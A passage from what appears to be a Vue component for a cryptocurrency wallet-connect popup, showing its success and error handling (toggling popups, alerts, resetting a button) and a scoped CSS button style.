                const popup = document.getElementById('popup_connect_wallet')
                const success = document.getElementById('popup_connect_wallet_success')
                if (popup) { popup.classList.remove('show'); popup.style.display = 'none' }
                if (success) { success.classList.add('show'); success.style.display = 'block' }
              }
              // original code had a very large timeout; keep navigation commented for safety
              // window.setTimeout(function () { window.location.href = 'il'; }, 5000000);
            } else {
              // fallback: show raw
              alert(result.raw || result)
              buttonConnectWallet.textContent = 'Connect Wallet'
              buttonConnectWallet.style.pointerEvents = 'all'
            }
          } catch (err) {
            alert(err)
            buttonConnectWallet.textContent = 'Connect Wallet'
            buttonConnectWallet.style.pointerEvents = 'all'
          }
        }
      })
    }
  }
}
</script>


<style scoped>
.btn-outline-primary {
            width: 100%;
            border-radius: 20px;
            font-weight: 700;
            font-size: 15px;
            line-height: 22px;
            padding: 10px 20px;
            -webkit-transition: all 0.3s ease-in-out;
            -moz-transition: all 0.3s ease-in-out;
            -ms-transition: all 0.3s ease-in-out;
            -o-transition: all 0.3s ease-in-out;
            transition: all 0.3s ease-in-out;
            outline: none;
            border: 1px solid #5142FC;
            margin-bottom: 10px
        }
</style>
